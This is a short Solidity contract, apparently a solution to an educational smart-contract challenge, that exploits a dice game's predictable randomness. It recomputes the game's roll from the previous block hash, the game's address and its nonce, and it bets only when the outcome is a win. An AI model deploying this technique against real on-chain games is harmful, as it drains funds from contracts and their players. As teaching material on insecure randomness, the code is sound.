pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Not enough Balance!");
        payable(_addr).transfer(_amount);
    }

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Not enough balance!");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;
        require(roll <= 2, "You'll Loose");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    receive() external payable {}
}
